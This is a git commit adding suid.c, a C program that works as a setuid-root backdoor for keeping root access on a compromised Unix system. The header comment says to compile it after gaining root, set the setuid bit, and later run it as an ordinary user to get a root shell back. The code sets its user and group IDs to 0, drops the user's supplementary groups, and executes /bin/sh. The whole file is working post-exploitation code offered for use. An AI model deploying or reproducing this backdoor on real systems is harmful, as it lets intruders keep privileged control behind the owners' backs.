5fdf5d1d83baf533aa69a027e322daebb7b69172
Darkerego <darkerego@users.noreply.github.com>
2016-01-18 23:54:43 -0500

    Create suid.c

---
+++ suid.c
@@ -0,0 +1,50 @@
+/*
+* If you manage to get root access to a system , than it might be a good idea
+* to maintain root access. It's as easy as compiling this binary... :
+* root@box:~ : su lame
+* lame@box~: whoami
+* lame
+* gcc suid.c -o suid && chmod u+s
+* ./suid
+* root@box~:
+* whoami
+* root
+*/
+
+#include <unistd.h>	/* setuid, .. */
+#include <sys/types.h>	/* setuid, .. */
+#include <grp.h>	/* setgroups */
+#include <stdio.h>	/* perror */
+
+int main (int argc, char** argv) {
+
+  gid_t newGrp = 0;
+
+  /**
+    if you installed programming manual pages, you can get the
+    man page for execve 'man execvp'. Same goes for all the
+    other system calls that we're using here.
+   */
+
+  /* this will tattoo the suid bit so that bash won't see that
+     we're not really root. we also drop all other memberships
+     just in case we're running with PAGs (in AFS) */
+  if (setuid(0) != 0) {
+    perror("Setuid failed, no suid-bit set?");
+    return 1;
+  }
+  setgid(0);
+  seteuid(0);
+  setegid(0);
+  /* we also drop all the groups that the old user had
+     (verify with id -tool afterwards)
+     this is not strictly necessary but we want to get rid of the
+     groups that the original user was part of. */
+  setgroups(1, &newGrp);
+  
+  /* load the default shell on top of this program
+     to exit from the shell, use 'exit' :-) */
+  execvp("/bin/sh", argv); 
+
+  return 0;
+}
